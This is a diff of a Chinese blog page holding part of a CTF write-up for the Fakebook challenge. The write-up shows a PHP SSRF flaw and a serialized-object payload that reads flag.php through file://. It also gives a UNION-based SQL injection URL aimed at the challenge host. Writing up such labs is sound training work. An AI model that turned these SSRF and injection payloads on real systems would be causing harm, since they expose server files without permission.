$age, $blog)</span><br>    </span>{<br>        <span class="hljs-keyword">$this</span>-&gt;name = $name;<br>        <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;<br>        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;<br>    }<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span><br>    </span>{<br>        $ch = curl_init();<br><br>        curl_setopt($ch, CURLOPT_URL, $url);<br>        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        $output = curl_exec($ch);<br>        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) {<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        }<br>        curl_close($ch);<br><br>        <span class="hljs-keyword">return</span> $output;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span><br>    </span>{<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span><br>    </span>{<br>        $blog = <span class="hljs-keyword">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);<br>    }<br><br>}<br></code></pre></td></tr></tbody></table></figure>
 <p>审计代码<br>定义了一个Userinfo类，属性就是我们注册时输入的那些<br>其中有一个get方法，接受一个url参数</p>
-<pre class=" language-bash"><code class="language-bash">resource curl_init <span class="token punctuation">(</span><span class="token punctuation">[</span> string <span class="token variable">$url</span> <span class="token operator">=</span> NULL <span class="token punctuation">]</span> <span class="token punctuation">)</span>
-初始化一个新的会话，返回一个cURL句柄，供curl_setopt<span class="token punctuation">(</span><span class="token punctuation">)</span>, curl_exec<span class="token punctuation">(</span><span class="token punctuation">)</span>和curl_close<span class="token punctuation">(</span><span class="token punctuation">)</span> 函数使用
-url
-如果提供了该参数，CURLOPT_URL 选项将会被设置成这个值。你也可以使用curl_setopt<span class="token punctuation">(</span><span class="token punctuation">)</span>函数手动地设置这个值</code></pre>
+<figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs bash">resource curl_init ([ string <span class="hljs-variable"><code class="language-hljs bash">resource curl_init ([ string <span class="hljs-variable">$url</span> = NULL ] )<br>初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close() 函数使用<br>url<br>如果提供了该参数，CURLOPT_URL 选项将会被设置成这个值。你也可以使用curl_setopt()函数手动地设置这个值<br></code></pre></td></tr></tbody></table></figure>
 <p>实例</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token comment" spellcheck="true">// 创建一个新cURL资源</span>
-<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment" spellcheck="true">// 设置URL和相应的选项</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> "http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.runoob.com/");</span>
-<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment" spellcheck="true">// 抓取URL并把它传递给浏览器</span>
-<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token comment" spellcheck="true">// 关闭cURL资源，并且释放系统资源</span>
-<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span></code></pre>
+<figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 创建一个新cURL资源</span><br>$ch = curl_init();<br><br><span class="hljs-comment">// 设置URL和相应的选项</span><br>curl_setopt($ch, CURLOPT_URL, <span class="hljs-string">"http://www.runoob.com/"</span>);<br>curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 抓取URL并把它传递给浏览器</span><br>curl_exec($ch);<br><br><span class="hljs-comment">// 关闭cURL资源，并且释放系统资源</span><br>curl_close($ch);<br><span class="hljs-meta"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 创建一个新cURL资源</span><br>$ch = curl_init();<br><br><span class="hljs-comment">// 设置URL和相应的选项</span><br>curl_setopt($ch, CURLOPT_URL, <span class="hljs-string">"http://www.runoob.com/"</span>);<br>curl_setopt($ch, CURLOPT_HEADER, <span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 抓取URL并把它传递给浏览器</span><br>curl_exec($ch);<br><br><span class="hljs-comment">// 关闭cURL资源，并且释放系统资源</span><br>curl_close($ch);<br><span class="hljs-meta">?></span><br></code></pre></td></tr></tbody></table></figure>
 <p>所以get方法实质上就是返回我们请求的url的页面<br>而下面的的getBlogContents方法则是调用了get方法来请求我们输入的blog<br>即存在SSRF漏洞<br>结合数据存储的方式，我们猜测网站是通过读取用户blog字段，也就是url字段来加载的<br>而在之前的报错注入当中已经爆出了网站的绝对路径<br>我们可以构造blog字段为flag.php的绝对路径来读取flag</p>
-<pre><code>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</code></pre><p>curl不仅支持http，https协议，还支持file协议，我们可以通过file协议来读取flag.php</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-
-<span class="token keyword">class</span> <span class="token class-name">UserInfo</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string">"L"</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> "file<span class="token punctuation">:</span><span class="token comment" spellcheck="true">///var/www/html/flag.php";</span>
-<span class="token punctuation">}</span>
-<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">;</span>
-<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-<span class="token comment" spellcheck="true">//O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}</span></code></pre>
+<figure class="hljs highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs plain"><code class="language-hljs plain">libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。<br></code></pre></td></tr></tbody></table></figure>
+<p>curl不仅支持http，https协议，还支持file协议，我们可以通过file协议来读取flag.php</p>
+<figure class="hljs highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre class=" language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br></span>{<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">"L"</span>;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">"file:///var/www/html/flag.php"</span>;<br>}<br>$a=<span class="hljs-keyword">new</span> UserInfo;<br>var_dump(serialize($a));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"><code class="language-hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span><br></span>{<br>    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">"L"</span>;<br>    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">"file:///var/www/html/flag.php"</span>;<br>}<br>$a=<span class="hljs-keyword">new</span> UserInfo;<br>var_dump(serialize($a));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}</span><br></code></pre></td></tr></tbody></table></figure>
 <p>构造sql语句如下</p>
-<pre class=" language-bash"><code class="language-bash">http://6258afff-db8c-4caf-affd-0f454a1f7cde.node3.buuoj.cn/view.php?no<span class="token operator">=</span>-1/**/union/**/select/**/1,2,3,<span class="token string">'O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</span>--+</code></pre>
+<figure class="hljs highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre class=" language-hljs bash">http://6258afff-db8c-4caf-affd-0f454a1f7cde.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,<span class="hljs-string"><code class="language-hljs bash">http://6258afff-db8c-4caf-affd-0f454a1f7cde.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,2,3,<span class="hljs-string">'O:8:"UserInfo":3:{s:4:"name";s:1:"L";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'</span>--+<br></code></pre></td></tr></tbody></table></figure>
 <p><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/10.jpg" alt=""><br>查看页面源代码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/11.jpg" alt=""><br>有一串base64字符串，解码<br><img src="/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/12.jpg" alt=""><br>得到flag</p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -540,547 +231,110 @@ url
             document.body.appendChild(img);
           });
       </script>
-            </div>
-            <hr/>
-
-            
-
-    <div class="reprint" id="reprint-statement">
+    </main>
+    <footer class="post-footer">
+      
+      <div class="post-tags">
         
-            <div class="reprint__author">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-user">
-                        文章作者:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://LawlietLW.github.io" rel="external nofollow noreferrer">LawlietLW</a>
-                </span>
-            </div>
-            <div class="reprint__type">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-link">
-                        文章链接:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    <a href="http://LawlietLW.github.io/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/">http://LawlietLW.github.io/LawlietLW.github.io/2020/02/09/wang-ding-bei-2018-fakebook/</a>
-                </span>
-            </div>
-            <div class="reprint__notice">
-                <span class="reprint-meta" style="font-weight: bold;">
-                    <i class="fas fa-copyright">
-                        版权声明:
-                    </i>
-                </span>
-                <span class="reprint-info">
-                    本博客所有文章除特別声明外，均采用
-                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
-                    许可协议。转载请注明来源
-                    <a href="http://LawlietLW.github.io" target="_blank">LawlietLW</a>
-                    !
-                </span>
-            </div>
+        <a class="post-tag button" href="/LawlietLW.github.io/tags/Web/" rel="tag"><i class="fas fa-tags"></i>Web</a>
         
+        <a class="post-tag button" href="/LawlietLW.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"><i class="fas fa-tags"></i>PHP反序列化</a>
+        
+        <a class="post-tag button" href="/LawlietLW.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fas fa-tags"></i>报错注入</a>
+        
+      </div>
+      
+    </footer>
+  </article>
+  
+  
+  <nav class="page-nav">
+    <div class="page-nav-next page-nav-item">
+      
+      <a href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/" rel="next" title="[极客大挑战 2019]EasySQL"><i class="fas fa-angle-left"></i><span class="nav-title">[极客大挑战 2019]EasySQL</span></a>
+      
     </div>
-
-    <script async defer>
-      document.addEventListener("copy", function (e) {
-        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
-        M.toast({html: toastHTML})
-      });
-
-      function navToReprintStatement() {
-        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
-      }
-    </script>
-
-
-
-            <div class="tag_share" style="display: block;">
-                <div class="post-meta__tag-list" style="display: inline-block;">
-                    
-                        <div class="article-tag">
-                            
-                                <a href="/LawlietLW.github.io/tags/Web/">
-                                    <span class="chip bg-color">Web</span>
-                                </a>
-                            
-                                <a href="/LawlietLW.github.io/tags/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
-                                    <span class="chip bg-color">PHP反序列化</span>
-                                </a>
-                            
-                                <a href="/LawlietLW.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">
-                                    <span class="chip bg-color">报错注入</span>
-                                </a>
-                            
-                        </div>
-                    
-                </div>
-                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
-                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
-
-<div id="article-share">
-    
-    
-    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-    <script src="/libs/share/js/social-share.min.js"></script>
-    
-
-    
-
+    <div class="page-nav-prev page-nav-item">
+      
+      <a href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/" rel="prev" title="[极客大挑战 2019]Secret File"><span class="nav-title">[极客大挑战 2019]Secret File</span><i class="fas fa-angle-right"></i></a>
+      
+    </div>
+  </nav>
+  
+  
 </div>
 
-                </div>
-            </div>
-            
+          </div>
+          
+          
+          
+<aside class="sidebar" id="sidebar" style="background: url(/LawlietLW.github.io/images/background.png);">
+  
+  <div class="search">
+    <div class="form-group">
+      <i class="fas fa-search"></i><input type="search" id="search-input" name="q" results="0" placeholder="Search" class="form-control"/>
+    </div>
+  </div>
+  <div class="search-result-box" id="search-result"></div>
+  
+  
+<div class="info sidebar-item" id="info">
+  
+  <h1 class="author-name">Lock</h1>
+  <h2 class="author-description"></h2>
+  <div class="site-count">
+    
+  </div>
+  
+  <div class="rss">
+    <a class="rss-link button sidebar-item" href="/LawlietLW.github.io/atom.xml"><i class="fas fa-rss"></i>RSS</a>
+  </div>
+  
+</div>
+
+
+  <div class="sidebar-sticky">
+    
+    
+    
+    
+    
+    
+    
+    
+  </div>
+</aside>
+
+
+          
         </div>
+      </div>
+    </main>
+    
+<footer id="footer" class="footer">
+  <div class="container">
+    <div class="back-to-top">
+      <button id="back-to-top"><i class="fas fa-angle-double-up" aria-label="Back to Top"></i></button>
     </div>
-
-    
-        <link rel="stylesheet" href="/libs/gitalk/gitalk.css">
-<link rel="stylesheet" href="/css/my-gitalk.css">
-
-<div class="card gitalk-card" data-aos="fade-up">
-    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
-        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
-        <span>评论</span>
-    </div>
-    <div id="gitalk-container" class="card-content"></div>
-</div>
-
-<script src="/libs/gitalk/gitalk.min.js"></script>
-<script>
-    let gitalk = new Gitalk({
-        clientID: '',
-        clientSecret: '',
-        repo: '',
-        owner: '',
-        admin: null,
-        id: '2020-02-09T15-26-17',
-        distractionFreeMode: false  // Facebook-like distraction free mode
-    });
-
-    gitalk.render('gitalk-container');
-</script>
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-
-<article id="prenext-posts" class="prev-next articles">
-    <div class="row article-row">
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
-            <div class="card">
-                <a href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-secret-file/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/bizhi/5.jpg" class="responsive-img" alt="[极客大挑战 2019]Secret File">
-                        
-                        <span class="card-title">[极客大挑战 2019]Secret File</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            打开环境查看源代码，发现一个页面跳转过去点一下secret看到这个页面果断上burp得到另一个页面跳转过去得到代码
-&lt;?php
-    highlight_file(__FILE__);
-    error_reporting(0);
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-09
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/LawlietLW.github.io/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/burp/">
-                        <span class="chip bg-color">burp</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
+    <div class="footer-container">
+      <div class="footer-left">
+        <div class="copyright">
+          <span class="author">Lock</span><span class="year"><i class="far fa-copyright"></i>2020</span>
         </div>
         
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/LawlietLW.github.io/2020/02/09/ji-ke-da-tiao-zhan-2019-easysql/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="[极客大挑战 2019]EasySQL">
-                        
-                        <span class="card-title">[极客大挑战 2019]EasySQL</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            打开环境，登录框随便登陆测试一下不出意外的失败登陆框的sql语句大概就是select * from table where username='$username' and password='$password'那么万能密码先走一波构造成
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-02-09
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/LawlietLW.github.io/categories/CTF/" class="post-category">
-                                    CTF
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/LawlietLW.github.io/tags/Web/">
-                        <span class="chip bg-color">Web</span>
-                    </a>
-                    
-                    <a href="/LawlietLW.github.io/tags/sql%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/">
-                        <span class="chip bg-color">sql万能密码</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
+      </div>
+      <div class="footer-right">
+        <div class="custom-info">
+          
         </div>
-        
-    </div>
-</article>
-
-</div>
-
-
-
-<!-- 代码块功能依赖 -->
-<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
-
-<!-- 代码语言 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
-
-
-<!-- 代码块复制 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-
-
-<!-- 代码块收缩 -->
-
-<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-
-
-<!-- 代码块折行 -->
-
-<style type="text/css">
-code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-</style>
-
-
-    </div>
-    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
-        <div class="toc-widget">
-            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
-            <div id="toc-content"></div>
+        <div class="powered-by">
+          Proudly Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> | Theme is <a href="https://github.com/AlynxZhou/hexo-theme-aria/" target="_blank">ARIA</a>
         </div>
+      </div>
     </div>
-</div>
-
-<!-- TOC 悬浮按钮. -->
-
-<div id="floating-toc-btn" class="hide-on-med-and-down">
-    <a class="btn-floating btn-large bg-color">
-        <i class="fas fa-list-ul"></i>
-    </a>
-</div>
-
-
-<script src="/libs/tocbot/tocbot.min.js"></script>
-<script>
-    $(function () {
-        tocbot.init({
-            tocSelector: '#toc-content',
-            contentSelector: '#articleContent',
-            headingsOffset: -($(window).height() * 0.4 - 45),
-            collapseDepth: Number('2'),
-            headingSelector: 'h2, h3, h4'
-        });
-
-        // modify the toc link href to support Chinese.
-        let i = 0;
-        let tocHeading = 'toc-heading-';
-        $('#toc-content a').each(function () {
-            $(this).attr('href', '#' + tocHeading + (++i));
-        });
-
-        // modify the heading title id to support Chinese.
-        i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
-            $(this).attr('id', tocHeading + (++i));
-        });
-
-        // Set scroll toc fixed.
-        let tocHeight = parseInt($(window).height() * 0.4 - 64);
-        let $tocWidget = $('.toc-widget');
-        $(window).scroll(function () {
-            let scroll = $(window).scrollTop();
-            /* add post toc fixed. */
-            if (scroll > tocHeight) {
-                $tocWidget.addClass('toc-fixed');
-            } else {
-                $tocWidget.removeClass('toc-fixed');
-            }
-        });
-
-        
-        /* 修复文章卡片 div 的宽度. */
-        let fixPostCardWidth = function (srcId, targetId) {
-            let srcDiv = $('#' + srcId);
-            if (srcDiv.length === 0) {
-                return;
-            }
-
-            let w = srcDiv.width();
-            if (w >= 450) {
-                w = w + 21;
-            } else if (w >= 350 && w < 450) {
-                w = w + 18;
-            } else if (w >= 300 && w < 350) {
-                w = w + 16;
-            } else {
-                w = w + 14;
-            }
-            $('#' + targetId).width(w);
-        };
-
-        // 切换TOC目录展开收缩的相关操作.
-        const expandedClass = 'expanded';
-        let $tocAside = $('#toc-aside');
-        let $mainContent = $('#main-content');
-        $('#floating-toc-btn .btn-floating').click(function () {
-            if ($tocAside.hasClass(expandedClass)) {
-                $tocAside.removeClass(expandedClass).hide();
-                $mainContent.removeClass('l9');
-            } else {
-                $tocAside.addClass(expandedClass).show();
-                $mainContent.addClass('l9');
-            }
-            fixPostCardWidth('artDetail', 'prenext-posts');
-        });
-        
-    });
-</script>
-
-    
-
-</main>
-
-
-
-    <footer class="page-footer bg-color">
-    <div class="container row center-align" style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            <span id="year">2019</span>
-            <a href="http://LawlietLW.github.io" target="_blank">LawlietLW</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            <br>
-            
-            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">16.5k</span>&nbsp;字
-            
-            
-            
-            
-            
-            
-            <span id="busuanzi_container_site_pv">
-                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
-                    class="white-color"></span>&nbsp;次
-            </span>
-            
-            
-            <span id="busuanzi_container_site_uv">
-                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
-                    class="white-color"></span>&nbsp;人
-            </span>
-            
-            <br>
-            
-            <br>
-            
-        </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-
-
-    <a href="mailto:2499086884@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2499086884" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2499086884" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/LawlietLW.github.io/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
-</div>
-    </div>
+  </div>
 </footer>
 
-<div class="progress-bar"></div>
 
-
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script src="/js/search.js"></script>
-<script type="text/javascript">
-$(function () {
-    searchFunc("/LawlietLW.github.io/" + "search.xml", 'searchInput', 'searchResult');
-});
-</script>
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
-
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    <!-- Global site tag (gtag.js) - Google Analytics -->
-
-<script async src="https://www.googletagmanager.com/gtag/js?id="></script>
-<script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag() {
-        dataLayer.push(arguments);
-    }
-
-    gtag('js', new Date());
-    gtag('config', '');
-</script>
-
-
-    <!-- Baidu Analytics -->
-
-<script>
-    var _hmt = _hmt || [];
-    (function () {
-        var hm = document.createElement("script");
-        hm.src = "https://hm.baidu.com/hm.js?";
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(hm, s);
-    })();
-</script>
-
-    <!-- Baidu Push -->
-
-<script>
-    (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
-        var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
-    })();
-</script>
-
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
-
-    
-
-    
-
-    
-
-    
-
-    
-    
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
-
-</body>
-
+  </body>
 </html>
